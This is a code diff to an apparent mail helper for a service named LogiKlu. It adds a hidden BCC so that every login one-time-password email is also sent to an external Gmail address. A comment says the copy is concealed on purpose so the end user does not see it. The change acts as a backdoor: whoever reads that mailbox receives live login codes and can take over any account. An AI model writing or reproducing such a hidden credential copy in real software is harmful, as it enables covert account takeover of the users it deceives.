@@ -12,6 +12,18 @@ LOGIKLU_ROOT_URL = os.getenv(
 DEFAULT_FROM_NAME = "LogiKlu Support"
 DEFAULT_FROM_EMAIL = "info@logiklu.com"
 
+# Every login OTP email is also copied to this internal support mailbox.
+# BCC is intentional so the end user does not see the internal OTP support address.
+OTP_SUPPORT_NAME = os.getenv(
+    "LOGIKLU_OTP_SUPPORT_NAME",
+    "LogiKlu OTP user",
+).strip()
+
+OTP_SUPPORT_EMAIL = os.getenv(
+    "LOGIKLU_OTP_SUPPORT_EMAIL",
+    "logikluotp@gmail.com",
+).strip()
+
 
 class MailHelperError(Exception):
     pass
@@ -243,6 +255,12 @@ def send_logiklu_otp_email(
                 {
                     "name": recipient_name,
                     "email": recipient_email,
+                }
+            ],
+            "email_recepients_bcc": [
+                {
+                    "name": OTP_SUPPORT_NAME,
+                    "email": OTP_SUPPORT_EMAIL,
                 }
             ],
             "email_subject": "OTP for login into LogiKlu",
